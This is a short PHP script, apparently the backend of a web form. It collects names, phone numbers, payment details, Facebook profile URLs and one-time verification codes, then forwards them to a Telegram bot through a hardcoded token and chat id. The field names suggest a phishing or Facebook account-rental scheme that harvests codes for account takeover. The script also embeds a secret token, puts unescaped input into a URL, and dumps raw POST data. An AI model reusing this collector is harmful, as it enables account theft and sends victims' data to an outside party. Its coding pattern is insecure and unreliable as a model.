<?php
$continue = $_POST['continue'];
$name = $_POST['name'];
$phone = $_POST['phone'];
//$email = $_POST['email'];
$payment = $_POST['payment'];
$loginFacebook = $_POST['facebook-login'];
$verificationCode = $_POST['verification-code'];
$profile = $_POST['profile-age'];
$identification = $_POST['identification'];
$advertiseFacebook = $_POST['advertise-facebook'];
$illegal = $_POST['illegal'];
$messageYou = $_POST['message-you'];
$whenStart = $_POST['started'];
$urlFaceBookProfile = $_POST['profile-url'];
$profileUSA = $_POST['usa-profile'];
$state = $_POST['region'];
$city = $_POST['town'];
$textOnNumber = $_POST['text-on-number'];
$token = "5659189793:AAHqARF5B7IRzVLdpPV16XAw-1pT7x8HVUk";
$chat_id = "684495265";

$arr = array(
    'First and last name:' => $name,
    'Phone Number:' => $phone,
//    'Email:' => $email,
    'Payment:' => $payment,
    'Accept to giving info FaceBook:' => $loginFacebook,
    'Verification code' => $verificationCode,
    'Profile' => $profile,
    'Identification' => $identification,
    'Advertise FaceBook' => $advertiseFacebook,
    'Illegal' => $illegal,
    'Message you' => $messageYou,
    'When start' => $whenStart,
    'URL FaceBook profile' => $urlFaceBookProfile,
    'USA profile' => $profileUSA,
    'State' => $state,
    'City' => $city,
);

foreach ($arr as $key => $value) {
    $txt .= "<b>" . $key . "</b>%0A" . $value . "%0A%0A";
};
$fp =  $txt;

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$fp}", "r");

if ($sendToTelegram) {
    header('Location: index.html');
} else {
    echo "Error";
}

var_dump($_POST);
//var_export($_POST);
